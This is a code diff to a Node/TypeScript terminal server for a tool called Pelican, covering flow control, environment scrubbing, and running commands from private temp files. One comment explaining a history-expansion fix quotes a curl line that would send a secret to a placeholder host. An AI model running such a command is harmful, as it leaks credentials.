@@ -1,6 +1,7 @@
 import { execFile } from 'node:child_process';
 import { randomUUID } from 'node:crypto';
-import { access, constants } from 'node:fs/promises';
+import { accessSync, rmSync } from 'node:fs';
+import { access, constants, mkdtemp, rm, writeFile } from 'node:fs/promises';
 import os from 'node:os';
 import path from 'node:path';
 
@@ -12,7 +13,7 @@ import {
   sizeAllowed, TERMINAL_CLOSE, TERMINAL_LIMITS, terminalClientMessage,
   type TerminalAvailability, type TerminalColors, type TerminalExit, type TerminalInfo, type TerminalRunning, type TerminalServerMessage, utf8Pieces,
 } from '../shared/terminal.js';
-import { guardOutput } from '../shared/terminal-guards.js';
+import { dropPendingOutput, guardOutput, outputPieces, screenWork } from '../shared/terminal-guards.js';
 import { loadWidths } from '../shared/terminal-widths.js';
 import { onSignOut, refreshAuth } from './auth.js';
 import { config } from './config.js';
@@ -52,6 +53,12 @@ export const terminalTiming = {
   /** The copy of the screen may fall this far behind the shell before the shell waits for it too, and goes on below the second. */
   copyHigh: 1024 * 1024,
   copyLow: 256 * 1024,
+  /**
+   * …and have this many milliseconds of work before it, as parseMs reckons it, before the shell
+   * waits for it, going on below a quarter of it: a few KB of sequences that work over the whole
+   * screen take seconds at 500 by 300, where a megabyte of text takes a moment.
+   */
+  copyMs: 250,
   /** A page that makes no progress this long while the shell waits for it is let go (TERMINAL_CLOSE.behind). */
   stallMs: 10_000,
   /** How long a page's first screen may wait for a place between two escape sequences to be cut at. */
@@ -74,11 +81,11 @@ const HANGUP_MS = 1000;
 const REDRAW_MS = 60;
 
 /**
- * The copy of the screen takes in output this many characters at a time: xterm takes in a piece
- * whole, and some output takes long (a screen's worth of scrolling for every few bytes), so
- * Pelican answers everything else between pieces, at most a tenth of a second apart.
+ * About how long the copy of the screen takes over a piece of output (outputPieces), in ms: a
+ * sequence that works over the whole screen, its screenWork at 2 ns a step, the worst of them
+ * (scrolling the screen by its rows), and a character 30 ns, as on a laptop.
  */
-const COPY_PIECE = 512;
+const parseMs = (characters: number, wide: number, cols: number, rows: number): number => (wide * screenWork(cols, rows, TERMINAL_LIMITS.scrollback) * 2 + characters * 30) / 1e6;
 
 /** Too many terminals run already (TERMINAL_LIMITS.terminals), and none of them has ended. */
 export class TooManyTerminals extends Error {}
@@ -89,23 +96,28 @@ const OUTER = new Set([
   'COLUMNS', 'LINES', 'TERMCAP', 'WINDOWID', 'TMUX', 'TMUX_PANE', 'STY', 'WINDOW', 'VTE_VERSION', 'WT_SESSION',
   'WT_PROFILE_ID', 'TERMINAL_EMULATOR', '__CFBundleIdentifier', 'XPC_SERVICE_NAME', 'XPC_FLAGS', 'INVOCATION_ID',
   'JOURNAL_STREAM', 'NOTIFY_SOCKET', 'LISTEN_PID', 'LISTEN_FDS', 'LISTEN_FDNAMES', 'MANAGERPID', 'SYSTEMD_EXEC_PID',
-  'SHLVL', 'OLDPWD', '_', 'CLAUDE_CODE_SSE_PORT',
+  'SHLVL', 'OLDPWD', '_',
 ]);
 const OUTER_PREFIX = /^(ITERM_|KITTY_|WEZTERM_|ALACRITTY_|GHOSTTY_|VSCODE_|KONSOLE_|GNOME_TERMINAL_)/;
 /**
- * Pelican's own settings, npm's when npm started Pelican, the mark Claude Code leaves on what it
- * runs, and what the Agent SDK sets in Pelican's own process: its version, with each query (which
- * `claude` would take to say it is an Agent SDK client), and a setting for Windows' cmd.
+ * Pelican's own settings; npm's when npm started Pelican (npm_*, and the folder it started in and
+ * the node it ran); Claude Code's own: the mark it leaves on what it runs, how it was started (the
+ * Agent SDK sets that in Pelican's own process), and when Pelican itself was started from a Claude
+ * Code session, that session's (its id, its messaging socket and the token for it, its IDE's
+ * port), none of which is this shell's to use; and what the Agent SDK sets in Pelican's own
+ * process: its version, with each query (which `claude` would take to say it is an Agent SDK
+ * client), and a setting for Windows' cmd.
  */
-const PELICANS = /^(PELICAN_|npm_|CLAUDE_AGENT_SDK_)|^(CLAUDECODE|NoDefaultCurrentDirectoryInExePath)$/;
+const PELICANS = /^(PELICAN_|npm_|CLAUDE_CODE_|CLAUDE_AGENT_SDK_)|^(CLAUDECODE|INIT_CWD|NODE|NoDefaultCurrentDirectoryInExePath)$/;
 
 /**
- * The shell's environment: Pelican's, without its own settings (PELICAN_*), npm's (npm_*),
- * Claude Code's mark (CLAUDECODE, which would stop `claude` from starting there), the Agent SDK's
- * (CLAUDE_AGENT_SDK_*) and what describes the terminal or service Pelican runs in; with
- * `launch`, what launchFor gives Claude
- * Code and `!` commands in the folder (in one kept to the user's settings only, git settings that
- * turn the repository's own programs off), so the shell runs as Claude does there.
+ * The shell's environment: Pelican's, without its own settings (PELICAN_*), npm's (npm_*,
+ * INIT_CWD, NODE), Claude Code's own (CLAUDECODE, which would stop `claude` from starting there,
+ * and CLAUDE_CODE_*), the Agent SDK's (CLAUDE_AGENT_SDK_*) and what describes the terminal or
+ * service Pelican runs in; with `launch`, what launchFor gives Claude Code and `!` commands in the
+ * folder (in one kept to the user's settings only, git settings that turn the repository's own
+ * programs off), so the shell runs as Claude does there. What a shell needs (PATH, HOME, the
+ * locale, SSH's agent, a proxy) stays, and a login shell reads the user's own profile on top.
  */
 export function shellEnvironment(base: NodeJS.ProcessEnv, launch: Record<string, string> | undefined, shell: string): Record<string, string> {
   const env: Record<string, string> = {};
@@ -141,6 +153,27 @@ export async function loginShell(env: NodeJS.ProcessEnv = process.env): Promise<
 
 /** For tests: a shell to start, with these arguments, instead of the user's login shell. */
 export const testShell: { file?: string; args?: string[] } = {};
+
+/** The shell a terminal starts, as loginShell finds it, without waiting: named for a page (TerminalAvailability.shell). */
+function shellNow(env: NodeJS.ProcessEnv = process.env): string {
+  if (testShell.file) return testShell.file;
+  let account: string | null | undefined;
+  try {
+    account = os.userInfo().shell;
+  } catch {
+    account = undefined;
+  }
+  for (const candidate of [env.SHELL, account]) {
+    if (!candidate || !path.isAbsolute(candidate)) continue;
+    try {
+      accessSync(candidate, constants.X_OK);
+      return candidate;
+    } catch {
+      // Not there, or not to be run: the next.
+    }
+  }
+  return '/bin/sh';
+}
 
 /** A program's name as a tab shows it: `/usr/bin/vim` and a login shell's `-zsh` as vim and zsh. */
 const programName = (raw: string) => path.basename(raw.trim()).replace(/^-/, '').slice(0, 64);
@@ -243,6 +276,8 @@ class Term {
   /** Bytes the shell printed, and how many of them the copy has taken in. */
   private received = 0;
   private parsed = 0;
+  /** The work the copy has yet to do on what it was given, in ms as parseMs reckons it. */
+  private backlog = 0;
   /** A key came from a page: what the shell prints next (its echo) goes out at once. */
   private keyed = false;
   /** Output the copy could not take was said in the log, once. */
@@ -258,6 +293,8 @@ class Term {
   private colors?: TerminalColors;
   private saidColors = 0;
   private typist?: Viewer;
+  /** The page whose size the shell has: the last typed in or resized, or the one that came alone. */
+  private sizer?: Viewer;
   private readonly setColors = new Map<number, [number, number, number]>();
   /**
    * Where in the output a page's Clear terminal falls (in bytes received), until the copy has
@@ -339,6 +376,9 @@ class Term {
       paused: this.paused,
       received: this.received,
       parsed: this.parsed,
+      backlog: this.backlog,
+      /** The copy of the screen itself. */
+      copy: this.screen,
       viewers: [...this.viewers].map((v) => ({ unacked: v.unacked, buffered: v.ws.bufferedAmount, joining: Boolean(v.joining) })),
     };
   }
@@ -348,13 +388,19 @@ class Term {
     this.lastActive = Date.now();
     const bytes = Buffer.from(text, 'utf8');
     this.received += bytes.length;
-    for (let at = 0; at < text.length; at += COPY_PIECE) {
-      const last = at + COPY_PIECE >= text.length;
-      this.screen.write(text.length <= COPY_PIECE ? text : text.slice(at, at + COPY_PIECE), last ? () => {
+    // The copy takes it in pieces of bounded work, so everything else is answered in between, and
+    // what it has yet to do is reckoned in time as well as in bytes (pressure).
+    const pieces = outputPieces(text, this.cols, this.rows);
+    pieces.forEach(({ data, wide }, at) => {
+      const ms = parseMs(data.length, wide, this.cols, this.rows);
+      this.backlog += ms;
+      this.screen.write(data, () => {
+        this.backlog -= ms;
+        if (at < pieces.length - 1) return;
         this.parsed += bytes.length;
         this.cut();
-      } : undefined);
-    }
+      });
+    });
     this.pending.push(bytes);
     this.pendingBytes += bytes.length;
     // The first output goes at once, and the first after a key, so typing never waits; what
@@ -366,7 +412,7 @@ class Term {
       this.flush();
       this.gathering = setTimeout(() => this.gathered(), terminalTiming.batchMs);
     }
-    if (this.received - this.parsed > terminalTiming.copyHigh) this.pressure();
+    if (this.received - this.parsed > terminalTiming.copyHigh || this.backlog > terminalTiming.copyMs) this.pressure();
     this.lookAtProgramSoon();
   }
 
@@ -415,16 +461,17 @@ class Term {
   /**
    * Flow control. The shell waits (its PTY is paused, so what it prints blocks) while a page owes
    * acknowledgements for, or has waiting in its socket, more than `high` bytes, or while the copy of
-   * the screen lags; it goes on once all are below `low`. A page that makes no progress at all for
-   * `stallMs` meanwhile (a phone asleep with its socket open) is let go, and repaints from the copy
-   * when it comes back, rather than holding up the shell and every other page.
+   * the screen lags, in bytes or in the time it will take (copyMs); it goes on once all are below
+   * `low`. A page that makes no progress at all for `stallMs` meanwhile (a phone asleep with its
+   * socket open) is let go, and repaints from the copy when it comes back, rather than holding up
+   * the shell and every other page.
    */
   private pressure(): void {
     if (this.closed) return;
     const now = Date.now();
     const lag = this.received - this.parsed;
-    let behind = lag > terminalTiming.copyHigh;
-    let caughtUp = lag < terminalTiming.copyLow;
+    let behind = lag > terminalTiming.copyHigh || this.backlog > terminalTiming.copyMs;
+    let caughtUp = lag < terminalTiming.copyLow && this.backlog < terminalTiming.copyMs / 4;
     for (const viewer of this.viewers) {
       const owed = viewer.unacked + (viewer.joining?.bytes ?? 0);
       const buffered = viewer.ws.bufferedAmount;
@@ -552,6 +599,7 @@ class Term {
   private leave(viewer: Viewer): void {
     if (!this.viewers.delete(viewer)) return;
     if (this.typist === viewer) this.typist = undefined;
+    if (this.sizer === viewer) this.sizer = undefined;
     if (viewer.joining) clearTimeout(viewer.joining.timer);
     viewer.stopBeating();
     this.lastActive = Date.now();
@@ -593,7 +641,9 @@ class Term {
       viewer.unacked = Math.max(0, viewer.unacked - message.bytes);
       this.pressure();
     } else if (message?.type === 'resize' && !this.exit) {
-      this.resize(message.cols, message.rows, viewer);
+      // Shown again, nobody typing or resizing: the size another page has the shell at stays.
+      if (message.shown && this.viewers.size > 1 && this.sizer && this.sizer !== viewer) return;
+      this.resize(message.cols, message.rows, viewer, Boolean(message.shown));
     } else if (message?.type === 'colors') {
       this.saidColors += 1;
       viewer.colors = { said: message.colors, turn: this.saidColors };
@@ -664,8 +714,12 @@ class Term {
     }, REDRAW_MS).unref();
   }
 
-  /** The shell takes the size of the page that last said one; the others are told. */
-  private resize(cols: number, rows: number, from: Viewer): void {
+  /**
+   * The shell takes the size of the page that last said one; the others are told, and with
+   * `toItToo`, that page as well (it asked as it showed again, and draws at the size once told).
+   */
+  private resize(cols: number, rows: number, from: Viewer, toItToo = false): void {
+    this.sizer = from;
     if (cols === this.cols && rows === this.rows) return;
     this.cols = cols;
     this.rows = rows;
@@ -676,7 +730,7 @@ class Term {
     }
     // The copy takes the size where it comes in the output, as the pages do.
     this.screen.write('', () => this.screen.resize(cols, rows));
-    this.tell({ type: 'size', cols, rows }, from);
+    this.tell({ type: 'size', cols, rows }, toItToo ? undefined : from);
   }
 
   private ended(code: number, signal: number | undefined): void {
@@ -709,12 +763,17 @@ class Term {
     this.tell({ type: 'program', program: name });
   }
 
+  /** Run in terminal's command, in its file of its own (commandFile), taken away as the terminal closes. */
+  runFile?: string;
+
   /**
-   * Run in terminal: types `command`, and Enter, once the shell is ready for it, its first output
-   * (the prompt) gone quiet. A shell that takes pastes (zsh, bash 5.1 and later, fish) gets it as
-   * one, as if pasted: its lines go in together, and run with the Enter after them.
+   * Run in terminal: types `line`, and Enter, once the shell is ready for it, its first output
+   * (the prompt) gone quiet: the line that has the shell read the command from its file
+   * (commandFile), or for a shell that reads none, the command itself, as a paste where the shell
+   * takes pastes (zsh, bash 5.1 and later, fish): its lines go in together, and run with the Enter
+   * after them.
    */
-  typeWhenReady(command: string): void {
+  typeWhenReady(line: string, asPaste = false): void {
     this.used = true;
     let done = false;
     let quiet: NodeJS.Timeout | undefined;
@@ -725,7 +784,7 @@ class Term {
       clearTimeout(quiet);
       clearTimeout(latest);
       if (this.exit || this.closed) return;
-      this.pty.write(this.screen.modes.bracketedPasteMode ? `\x1b[200~${command}\x1b[201~\r` : `${command}\r`);
+      this.pty.write(asPaste && this.screen.modes.bracketedPasteMode ? `\x1b[200~${line}\x1b[201~\r` : `${line}\r`);
       this.lookAtProgramSoon();
     };
     const listening = this.pty.onData(() => {
@@ -755,6 +814,11 @@ class Term {
     clearTimeout(this.gathering);
     clearInterval(this.watching);
     clearTimeout(this.programLook);
+    // What the copy of the screen had yet to take in goes, and the copy with it: a flood the shell
+    // printed keeps nobody busy once its terminal is closed.
+    dropPendingOutput(this.screen);
+    this.screen.dispose();
+    if (this.runFile) void rm(this.runFile, { force: true }).catch(() => undefined);
     if (this.paused) this.pty.resume();
     if (this.exit) return;
     try {
@@ -811,10 +875,10 @@ function refusal(): string | undefined {
 /** Whether the refusal is this Pelican's own (403), rather than the computer's (503). */
 export const terminalsRefused = (): boolean => refusal() !== undefined;
 
-/** Whether terminals run here, and why not, found without loading anything (for /api/info). */
+/** Whether terminals run here, and why not, found without loading anything (for /api/info); the shell they run. */
 export function terminalAvailability(): TerminalAvailability {
   const reason = refusal() ?? ptyFailure() ?? ptyMissing();
-  return reason ? { available: false, reason } : { available: true };
+  return reason ? { available: false, reason } : { available: true, shell: programName(shellNow()) };
 }
 
 /** The same, for sure: the PTY is loaded, the first time a page asks for terminals. */
@@ -823,7 +887,7 @@ export async function terminalsReady(): Promise<TerminalAvailability> {
   if (refused) return { available: false, reason: refused };
   try {
     await loadPty();
-    return { available: true };
+    return { available: true, shell: programName(shellNow()) };
   } catch (error) {
     return { available: false, reason: (error as Error).message };
   }
@@ -837,9 +901,67 @@ export function listTerminals(cwd?: string): TerminalInfo[] {
 }
 
 /**
+ * Run in terminal's commands, each in a file of its own in a folder of this account's alone, which
+ * the shell is told to read (`.`, or `source`) rather than the command typed at its prompt. A line
+ * typed there is one bash, zsh, csh and tcsh expand a `!` in, from the history, before it runs,
+ * also inside double quotes: `echo "!?SECRET?"` printed a secret from the history file, and a
+ * `curl "https://x.example/?d=!?SECRET?"` would have sent it off, though the block read as it runs
+ * once Claude's own tools ran it. A file read in is not expanded so: the command runs as it reads,
+ * in the shell, its folder and its variables, as if typed. A shell that reads no such file (an
+ * unusual one, with no history to expand from `!`) gets the command typed, as before.
+ */
+let runFolder: Promise<string> | undefined;
+let runFolderMade: string | undefined;
+let runCount = 0;
+
+/** A path the shells read as it is, quoted in none of them. */
+const PLAIN_PATH = /^[\w./-]+$/;
+
+/** The folder for the commands' files: in /tmp (a short path to read at the prompt), or else the system's temporary folder. */
+function runFolderNow(): Promise<string> {
+  if (runFolder) return runFolder;
+  const made = (async () => {
+    for (const base of ['/tmp', os.tmpdir()]) {
+      // mkdtemp makes it readable by this account alone (0700), under a name nobody else picks.
+      const dir = await mkdtemp(path.join(base, 'pelican-run-')).catch(() => undefined);
+      if (dir && PLAIN_PATH.test(dir)) return (runFolderMade = dir);
+      if (dir) await rm(dir, { recursive: true, force: true });
+    }
+    throw new Error('Pelican found no folder of its own to run the command from.');
+  })();
+  // A folder that could not be made is tried again next time.
+  made.catch(() => {
+    if (runFolder === made) runFolder = undefined;
+  });
+  runFolder = made;
+  return made;
+}
+
+/** How a shell, by the name a tab gives it, reads a file of commands into itself: `.` in sh's family, `source` in fish's and csh's. */
+function readsFile(shell: string): '.' | 'source' | undefined {
+  if (/^(sh|bash|rbash|zsh|dash|ash|ksh|ksh93|mksh|lksh|oksh|pdksh|yash|posh|osh|pwsh|powershell)$/i.test(shell)) return '.';
+  if (/^(fish|csh|tcsh|nu|xonsh)$/.test(shell)) return 'source';
+  return undefined;
+}
+
+/**
+ * Writes `command` for Run in terminal into a file of its own (readable by this account alone) and
+ * says the line that has `shell` read it in; undefined for a shell that reads no such file.
+ */
+export async function commandFile(command: string, shell: string): Promise<{ file: string; line: string } | undefined> {
+  const reads = readsFile(shell);
+  if (!reads) return undefined;
+  runCount += 1;
+  // PowerShell reads in only a file whose name ends .ps1.
+  const file = path.join(await runFolderNow(), `${runCount}${/^(pwsh|powershell)$/i.test(shell) ? '.ps1' : ''}`);
+  await writeFile(file, `${command}\n`, { mode: 0o600, flag: 'wx' });
+  return { file, line: `${reads} ${file}` };
+}
+
+/**
  * Starts the user's shell, as a login shell, in `cwd` (checked by the caller, with launchFor's
- * `env`), and types `command` into it once it is ready. An ended terminal makes room when as many
- * run as may, else one never used (unused); otherwise TooManyTerminals.
+ * `env`), and has it run `command` once it is ready (commandFile). An ended terminal makes room
+ * when as many run as may, else one never used (unused); otherwise TooManyTerminals.
  */
 export async function openTerminal(cwd: string, size: { cols: number; rows: number }, options: { env?: Record<string, string>; command?: string; colors?: TerminalColors } = {}): Promise<TerminalInfo> {
   const refused = refusal();
@@ -853,10 +975,17 @@ export async function openTerminal(cwd: string, size: { cols: number; rows: numb
     if (!room) throw new TooManyTerminals(`At most ${TERMINAL_LIMITS.terminals} terminals run at once. Close one to open another.`);
     room.close();
   }
+  // The command's file is written before the shell starts: one that cannot be written fails here.
+  const run = options.command ? await commandFile(options.command, programName(file)) : undefined;
   const pty = spawn(file, args, { name: 'xterm-256color', cols: size.cols, rows: size.rows, cwd, env: shellEnvironment(process.env, options.env, file) });
   const term = new Term(cwd, pty, file, size.cols, size.rows, options.colors);
   terminals.set(term.id, term);
-  if (options.command) term.typeWhenReady(options.command);
+  if (run) {
+    term.runFile = run.file;
+    term.typeWhenReady(run.line);
+  } else if (options.command) {
+    term.typeWhenReady(options.command, true);
+  }
   if (!sweeping) {
     sweeping = setInterval(() => void closeIdleTerminals(), terminalTiming.idleCheckMs);
     sweeping.unref();
@@ -928,9 +1057,12 @@ export function closeTerminal(id: string): boolean {
   return Boolean(term);
 }
 
-/** Every terminal ends with Pelican. */
+/** Every terminal ends with Pelican, and Run in terminal's files with them. */
 export function closeAllTerminals(): void {
   for (const term of [...terminals.values()]) term.close(true);
+  if (runFolderMade) rmSync(runFolderMade, { recursive: true, force: true });
+  runFolder = undefined;
+  runFolderMade = undefined;
   clearInterval(sweeping);
   sweeping = undefined;
   clearInterval(checkingSignIns);
